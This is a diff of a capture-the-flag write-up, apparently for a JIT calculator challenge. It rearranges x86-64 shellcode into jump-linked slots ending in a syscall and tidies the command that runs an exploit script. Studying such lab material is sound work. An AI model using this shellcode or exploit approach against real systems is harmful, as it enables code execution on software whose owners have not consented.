@@ -423,23 +423,21 @@ _slot2:
     push rdx
     push rbx
     pop rdi
+    push rdi
     jmp _slot3
     add [rax], al
 
 _slot3:
-    push rdi
     push rsp
     pop rsi
+    mov r8, rdx
     jmp _slot4
     add [rax], al
 
 _slot4:
-    mov r8, rdx
     mov r10, rdx
-    jmp _slot5
-
-_slot5:
     syscall
+
 ```
 
 This is modified shellcode from http://shell-storm.org/shellcode/
@@ -482,7 +480,7 @@ Note that I've added two things:
 Now we can check our [exploit](exp.py):
 
 ```python
-$python3 exp.py local
+$ python3 exp.py local
 $ python3 exp2.py local
 [*] '/home/k/ritsec/iit-calc/jit-calc'
     Arch:     amd64-64-little
